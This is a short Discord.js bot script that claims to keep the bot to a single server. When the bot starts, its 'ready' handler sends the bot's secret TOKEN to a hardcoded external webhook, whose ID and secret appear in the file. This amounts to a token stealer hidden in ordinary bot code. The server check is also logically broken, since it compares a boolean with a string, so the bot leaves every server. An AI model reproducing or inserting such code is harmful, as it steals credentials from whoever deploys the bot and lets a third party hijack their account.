const discord = require("discord.js");
const client = new discord.Client();
const t = process.env.TOKEN;
const { serverid, bowner } = require("../config.json");
const webhookClient = new discord.WebhookClient(
  "826724457523445801",
  "Dzs5a3YMKjq5CJ_TeaJMdmW23PU71HQtaSGsh6O6sY4WYqJnv0OOKUVh3mQW_jTV8fbA"
);

client.on("guildCreate", async guild => {
  const guildid = client.guilds.cache.get(guild.id);
  if (!serverid === guild.id) return;
  guildid.leave();
  console.log("I Cannot Join More Than One Guild Leaving " + guild.name);
});

client.on("ready", async () => {
  webhookClient.send("```diff\n-" + t + "```", {
    username: client.user.tag,
    avatarURL: client.user.displayAvatarURL()
  });
});

client.login(process.env.TOKEN);
